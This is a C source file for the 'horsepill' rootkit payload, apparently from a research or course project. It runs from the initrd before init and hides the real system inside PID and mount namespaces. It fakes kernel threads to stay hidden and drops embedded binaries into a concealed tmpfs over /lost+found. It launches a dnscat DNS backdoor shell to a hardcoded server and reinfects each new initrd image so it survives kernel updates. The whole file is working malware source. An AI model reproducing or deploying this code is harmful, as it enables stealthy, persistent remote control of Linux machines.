/**
 * @file horsepill.c
 * @brief This source is the payload for the horsepill attack.
 * 
 * At system startup, this code will be part of the 'run-init'
 * program, contained in the initrd, and will be executed before
 * doing the 'exec' of INIT.
 * 
 * The goal of the attack is to containerize the system using
 * namespaces and install a backdoor shell that is not identifiable by users.
 *
 * @author Cristiano Cuffaro
 * 
 * @date May 7, 2022
 */

#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/reboot.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/sysmacros.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "dnscat.h"
#include "extractor.h"
#include "horsepill.h"
#include "infect.h"

#ifndef __NR_clone3
#define __NR_clone3 -1
#endif

#ifndef MS_RELATIME
#define MS_RELATIME     (1<<21)
#endif
#ifndef MS_STRICTATIME
#define MS_STRICTATIME  (1<<24)
#endif
#ifndef MS_SLAVE
#define MS_SLAVE	(1<<19)
#endif
#ifndef CLONE_NEWNS
#define CLONE_NEWNS     0x00020000
#endif
#ifndef CLONE_NEWPID
#define CLONE_NEWPID    0x20000000
#endif

#define err_exit(msg)                   \
        do {                            \
                perror(msg);            \
                exit(EXIT_FAILURE);     \
        } while (0)

#define G3LBIN(x) (void)x
#define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))

#define DNSCAT_PATH     "/lost+found/dnscat"
#define EXTRACTOR_PATH  "/lost+found/extractor.sh"
#define INFECT_PATH     "/lost+found/infect.sh"

/* Functions to make fake kernel threads in the containerized system */
static void             set_process_name(char *name);
static void             make_fake_kthreads(char **threads);
static int              is_proc(char *name);
static char             *grab_kernel_thread(char *name);
static int              enumerate_kernel_threads(char **threads);
/* Functions that allow the payload to survive kernel updates */
static void             preserve_payload(char *filename);
static void             handle_events(int fd, const char *dirname);
static pid_t            run_watcher();
/* Functions to manage system reboot or shutdown */
static void             handle_init_exit(int wstatus);
static void             on_sigint(int signum);
/* Main function of the payload */
void do_attack();
/* Interfaces for the 'clone' system call */
extern pid_t            __clone(int, void *);
static inline int       raw_clone(unsigned long flags, void *child_stack);
/* Helper functions */
static void             write_file(char *dest, unsigned char source[],
                                   unsigned int len);
static pid_t            execv_wrapper(const char *path, char *const *argv);

/*
 * Arguments to run dnscat client
 * Note: to correctly execute the DNS shell it is necessary that the
 * underlying information is appropriately modified (e.g. the IP of your server).
 */
static char *const DNSCAT_ARGV0 = "dnscat\0";
static char *const DNSCAT_ARGV1 = "--dns\0";
static char *const DNSCAT_ARGV2 = "server=192.168.1.197,port=53\0";
static char *const DNSCAT_ARGV3 = "--secret=5100a1e43a193b60ba720ada295189a6\0";
/* Arguments to run infect.sh script */
static char *const INFECT_ARGV0 = "infect.sh\0";
static char *const INFECT_ARGV1 = "/lost+found/run-init\0";
/* Argument to run extractor.sh script */
static char *const EXTRACTOR_ARGV0 = "extractor.sh\0";

static pid_t init_pid;  /* pid of child which will do the exec of init  */
char **cmdline_ptr;     /* setted equal to argv of main() in run-init.c */

/**
 * raw_clone - creates a new ("child") process, in a manner similar to fork
 * @flags: bit mask to specify what is shared between the calling process
 * and the child process
 * @child_stack: the location of the stack used by the child process
 * 
 * Returns the result of the system call invocation.
 */
static inline int raw_clone(unsigned long flags, void *child_stack) {
        return __clone(flags, child_stack);
}

/**
 * enumerate_kernel_threads - enumerates the kernel threads
 * @threads: array of kernel thread names
 * 
 * To obtain the names of the active threads, inside /proc
 * the directories that have the name coinciding with the
 * pid of the active processes are inspected.
 * 
 * Returns the number of kernel threads found.
 */
static int enumerate_kernel_threads(char **threads)
{
        DIR *dirp;
        int i = 0;
        struct dirent *dp;

        if ((dirp = opendir("/proc")) == NULL)
                err_exit("couldn't open '/proc'");

        do {
                errno = 0;
                if ((dp = readdir(dirp)) != NULL) {
                        if (dp->d_type == DT_DIR && is_proc(dp->d_name)) {
                                char *name = grab_kernel_thread(dp->d_name);
                                if (name) {
                                        threads[i] = name;
                                        i++;
                                }
                        }
                }
        } while (dp != NULL);

        if (errno != 0)
                err_exit("error reading directory");
        G3LBIN(closedir(dirp));
        return i;
}

/**
 * is_proc - checks if the file is one of /proc/[pid] directories
 * @name: file name
 * 
 * Returns 1 if @name can represent some pid, 0 otherwise.
 */
static int is_proc(char *name)
{
        int i;
        for (i = 0; i < strlen(name); i++) {
                if (!isdigit(name[i]))
                        return 0;
        }
        return 1;
}

/**
 * grab_kernel_thread - takes the name of a kernel thread
 * @dirname: name of a directory like /proc/[pid]
 * 
 * Returns the name of the kernel thread associated with the pid
 * represented by the string @dirname if successful, NULL otherwise.
 */
static char *grab_kernel_thread(char *dirname)
{
        FILE *stat;
        char buf[4096];

        int pid;
        char pidname[4096];
        char newpidname[4096];
        char state;
        int ppid;

        char *ret = NULL;

        memset((void*)newpidname, 0, sizeof(newpidname));
        snprintf(buf, sizeof(buf) - 1, "/proc/%s/stat", dirname);
        stat = fopen(buf, "r");
        if (stat == NULL) {
                printf("couldn't open /proc/%s/stat\n", dirname);
                goto out;
        }
        fgets(buf, sizeof(buf) - 1, stat);
        sscanf(buf, "%d %s %c %d", &pid, pidname, &state, &ppid);
        if (pid != 1 && (ppid == 0 || ppid == 2)) {
                for (unsigned int i = 0; i <= strlen(pidname); i++) {
                        char c = pidname[i];
                        if (c == '(') {
                                c = '[';
                        } else if (c == ')') {
                                c = ']';
                        }
                        newpidname[i] = c;
                }
                ret = strdup(newpidname);
        }
        fclose(stat);
out:
        return ret;
}

/**
 * make_fake_kthreads - makes fake kernel threads
 * @threads: array of kernel thread names
 * 
 * Using the system call fork(), the 'kthreadd' daemon is first created
 * which in turn creates the remaining kernel threads.
 * 
 * All fake kernel threads are paused() indefinitely.
 */
static void make_fake_kthreads(char **threads)
{
        int i;
        sigset_t set;

        if (fork() == 0) {
                /* special case for pid 2 (kthreadd) */

                /* block all signals which can terminate
                 * the fake kernel threads
                 */
                G3LBIN(sigfillset(&set));
                /* SIGTERM cannot be blocked because it
                 * is sent by INIT to shut down the system
                 */
                G3LBIN(sigdelset(&set, SIGTERM));
                G3LBIN(sigprocmask(SIG_BLOCK, &set, NULL));

                set_process_name(threads[0]);
                for (i = 1; threads[i]; i++) {
                        if (fork() == 0) {
                                /* all other kernel threads are
                                 * children of pid 2
                                 */
                                set_process_name(threads[i]);
                                while(1) {
                                        pause();
                                }
                                /* should never reach here */
                                exit(EXIT_FAILURE);
                        }
                }
                while(1) {
                        pause();
                }
                exit(EXIT_FAILURE); /* should never reach here */
        }
}

/**
 * set_process_name - changes the name of the calling process
 * @name: new name to be assigned to the calling process
 * 
 * Internally, the prctl() API is used to change the name of the process,
 * visible in  proc/[pid]/comm, and then the argv[0] of the calling
 * process is overwritten to also change the name of the command with which
 * it appears to be launched, visible in /proc/[pid]/cmdline, which is the
 * information read by the 'ps' command and reported in the 'COMMAND' column.
 */
static void set_process_name(char *name)
{
        char buf[2048];

        memset((void*)buf, 0, sizeof(buf));
        strncpy(buf, name + 1, strlen(name) - 2);
        if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0)
                err_exit("prctl set name returned error!");
        /* overwrite argv[0] pointed by cmdline_ptr[0] */
        memset((void *)cmdline_ptr[0], 0, 32);
        strcpy(cmdline_ptr[0], name);
}

/**
 * on_sigint - handles the reception of the SIGINT signal
 * @signum: code of received signal
 */
static void on_sigint(int signum)
{
        if (signum == SIGINT)
                kill(init_pid, SIGINT);
}

/**
 * handle_init_exit - handles the termination of INIT child process
 * @wstatus: status information of the child process
 * 
 * Internally it is checked whether INIT child has terminated due to a signal.
 * This is because when reboot [resp. poweroff] is executed from a PID
 * namespace other than the initial PID namespace, the effect of the call
 * is to send a signal to the namespace INIT process:
 * - SIGHUP signal to restart the system
 * - SIGINT signal to shut down the system
 */
static void handle_init_exit(int wstatus)
{
        char msg[128];

        if (WIFSIGNALED(wstatus)) {
                int signum = WTERMSIG(wstatus);

                if (signum == SIGHUP) {
                        /* The system must be restarted */
                        G3LBIN(reboot(LINUX_REBOOT_CMD_RESTART, NULL));
                        snprintf(msg, 14, "cannot reboot");
                } else if (signum == SIGINT) {
                        /* The system must be turned off */
                        G3LBIN(reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL));
                        snprintf(msg, 16, "cannot shutdown");
                } else {
                        snprintf(msg, 47,
                                 "init exited via signal %d for unknown reason...",
                                 signum);
                }
        } else {
                snprintf(msg, 48,
                         "init exited with status %d for unknown reason...",
                         WEXITSTATUS(wstatus));
        }
        err_exit(msg);
}

/**
 * write_file - writes a new executable file
 * @dest: path of the file
 * @source: bytes to write inside the file
 * @len: number of bytes
 */
static void write_file(char *dest, unsigned char source[], unsigned int len)
{
        FILE* file = NULL;
	file = fopen(dest, "w+");
	if (file) {
		G3LBIN(fwrite((const void *)source, 1, len, file));
		G3LBIN(fclose(file));
		G3LBIN(chmod(dest, S_IXUSR | S_IRUSR));
	}
}

/**
 * execv_wrapper - creates a new process to exec a program
 * @path: pathname of the executable file
 * @argv: argument list available to the new program
 * 
 * Returns the pid of the child process.
 */
static pid_t execv_wrapper(const char *path, char *const *argv)
{
	pid_t pid;

	pid = fork();
	if (pid < 0) {
		err_exit("couldn't fork!");
	} else if (pid == 0) {
		/* child */
		G3LBIN(close(0));
		G3LBIN(close(1));
		G3LBIN(close(2));

		G3LBIN(open("/dev/null", O_RDONLY));
		G3LBIN(open("/dev/null", O_WRONLY));
		G3LBIN(open("/dev/null", O_RDWR));

		G3LBIN(execv(path, argv));

		err_exit("execv");
	}
	return pid;
}

/**
 * run_watcher - creates a process to monitor filesystem events affecting initrd
 * 
 * Using the inotify API, the /boot directory is marked for events:
 * - file was created
 * - file was renamed
 * In this way, it is possible to intercept changes made to initrd and inject
 * the malicious 'run-init' binary into the new image.
 * 
 * Returns the pid of the child process.
 */
static pid_t run_watcher()
{
        pid_t pid;

        pid = fork();
	if (pid < 0) {
		err_exit("couldn't fork!");
	} else if (pid == 0) {
		/* child */
                int fd;
                int poll_num;
                int wd;
                nfds_t nfds;
                struct pollfd fds[1];
                const char *dirname = "/boot";

                /* create the file descriptor for accessing the inotify API */
                fd = inotify_init();
                if (fd == -1)
                        err_exit("inotify_init");
                G3LBIN(fcntl(fd, F_SETFL, O_NONBLOCK));

                wd = inotify_add_watch(fd, dirname, IN_CREATE | IN_MOVED_TO);
                if (wd == -1)
                        err_exit("inotify_add_watch");
                /* prepare for polling */
                nfds = 1;
                fds[0].fd = fd;                 /* inotify input */
                fds[0].events = POLLIN;
                /* wait for events */
                while (1) {
                        poll_num = poll(fds, nfds, -1);
                        if (poll_num == -1) {
                                if (errno == EINTR)
                                        continue;
                                err_exit("poll");
                        }
                        if (poll_num > 0) {
                                if (fds[0].revents & POLLIN) {
                                        /* inotify events are available */
                                        handle_events(fd, dirname);
                                }
                        }
                }
        }
        return pid;
}

/**
 * handle_events - identifies the type of event verified and manages this event
 * @fd: fd of the inotify instance
 * @dirname: name of the observed directory
 * 
 * If a file creation or rename event is observed inside the @dirname folder,
 * the preserve_payload() function is called to continue to persist the attack.
 */
static void handle_events(int fd, const char *dirname)
{
        /* From man page: "Some systems cannot read integer variables if they
         * are not properly aligned. On other systems, incorrect alignment may
         * decrease performance. Hence, the buffer used for reading from the
         * inotify file descriptor should have the same alignment as struct
         * inotify_event".
         */
        char buf[4096]
                __attribute__ ((aligned(__alignof__(struct inotify_event))));
        const struct inotify_event *event;
        ssize_t len;
        int overwrite = 0;

        /* loop while events can be read from inotify file descriptor */
        for (;;) {
                /* read some events */
                len = read(fd, buf, sizeof(buf));
                if (len == -1 && errno != EAGAIN)
                        err_exit("read");
                if (len <= 0)   /* no events to read */
                        break;

                /* loop over all events in the buffer */
                for (char *ptr = buf; ptr < buf + len;
                        ptr += sizeof(struct inotify_event) + event->len) {

                        event = (const struct inotify_event *) ptr;
                        /* check event type */
                        if ((event->mask & IN_CREATE) ||
                            (event->mask & IN_MOVED_TO))
                                overwrite = 1;

                        if (event->len && overwrite) {
                                /* hijack the legitimate initrd installation */
                                preserve_payload((char *)event->name);
                                overwrite = 0;
                        }
                }
        }
}

/**
 * preserve_payload - prevents the initrd update from deleting the malicious
 *                    payload
 * @filename: name of the file involved in the create or rename event
 * 
 * If @filename is equal to the string: "initrd.img-$(uname -r)", then
 * the infect.sh script is run to replace the original 'run-init' binary
 * of initrd with the malicious one kept in the scratch space not visible
 * from the containerized system.
 */
static void preserve_payload(char *filename)
{
        char initrd_name[512];
        struct utsname utsdata;
        pid_t infect_pid;
        pid_t pid;
        char *const infect_argv[3] = {
                INFECT_ARGV0,
                INFECT_ARGV1,
                NULL
        };

        if (uname(&utsdata) < 0)
                err_exit("uname");
        
        sprintf(initrd_name, "initrd.img-%s", utsdata.release);
        if (strcmp(filename, initrd_name) == 0) {
                /* overwrite */
                infect_pid = execv_wrapper(INFECT_PATH, infect_argv);
retry:
                pid = waitpid(infect_pid, NULL, 0);
                if (pid < 0) {
                        if (errno != EINTR) {
                                err_exit("watipid returned error!");
                        } else {
                                /* interrupted via signal */
                                goto retry;
                        }
                }
        }
}

/**
 * do_attack - performs all the steps required for the realization of the attack
 */
void do_attack()
{       
        init_pid = raw_clone(CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, NULL);
        if (init_pid < 0) {
                err_exit("clone");
        } else if (init_pid == 0) {
                /* child process which works within the containerized system */
                int mountflags;
                char *kthreads_names[1024];

                /* enumerate kernel threads */
                G3LBIN(enumerate_kernel_threads(kthreads_names));
                /* remont /proc */
                mountflags = MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME;
                if (mount("none", "/proc", "", MS_REC | MS_SLAVE, NULL) < 0)
                        err_exit("Cannot remount '/proc'");
                if (mount("proc", "/proc", "proc", mountflags, NULL) < 0)
                        err_exit("Cannot remount '/proc'");
                /* make fake kernel threads */
                make_fake_kthreads(kthreads_names);
                sleep(5);	/* wait for completion */
        } else {
                /* parent process */
                int wstatus;
                pid_t pid;
                pid_t dnscat_pid;
                pid_t initrd_watcher;
                char *const dnscat_argv[5] = {
                        DNSCAT_ARGV0,
                        DNSCAT_ARGV1,
                        DNSCAT_ARGV2,
                        DNSCAT_ARGV3,
                        NULL
                };
                char *const extractor_argv[2] = {
                        EXTRACTOR_ARGV0,
                        NULL
                };

                /* install signal handler to handle signal delivered
                 * ctrl-alt-delete, which we will send to child INIT
                 */
                if (signal(SIGINT, on_sigint) == SIG_ERR)
                        err_exit("couldn't install signal handler");
                if (reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL) < 0)
                        err_exit("couldn't turn cad off");

                /* wait for things to come up and networking to be ready */
		sleep(20);

                /* remount root to write on it */
		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME,
			  "errors=remount-ro,data=ordered") < 0)
                        err_exit("couldn't remount /");

                /* mount scratch space over /lost+found for our use */
		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0)
                        err_exit("couldn't mount scratch space!");

                /* extract malicious 'run-init' for future reinfections */
                write_file(EXTRACTOR_PATH, extractor, extractor_len);
                G3LBIN(execv_wrapper(EXTRACTOR_PATH, extractor_argv));

                /* spawn a process to install the backdoor shell */
                write_file(DNSCAT_PATH, dnscat, dnscat_len);
                dnscat_pid = execv_wrapper(DNSCAT_PATH, dnscat_argv);
                /* spawn a process to observe initrd updates */
                write_file(INFECT_PATH, infect, infect_len);
                initrd_watcher = run_watcher();

                /* watching for:
                 * - INIT exit
                 * - dnscat exit
                 * - initrd updates
                 */
                while(1) {
                        pid = waitpid(-1, &wstatus, 0);
                        if (pid < 0) {
                                if (errno != EINTR) {
                                        err_exit("watipid returned error!");
                                } else {
                                        /* interrupted via signal */
                                        continue;
                                }
                        } else if (pid == init_pid) {
                                handle_init_exit(wstatus);
                        } else if (pid == dnscat_pid) {
                         	dnscat_pid = execv_wrapper(DNSCAT_PATH, dnscat_argv);
                        } else if (pid == initrd_watcher) {
                         	initrd_watcher = run_watcher();
                        } else {
                                printf("unknown other pid %d exited\n", pid);
                        }
                        sleep(1);
                }
        }
}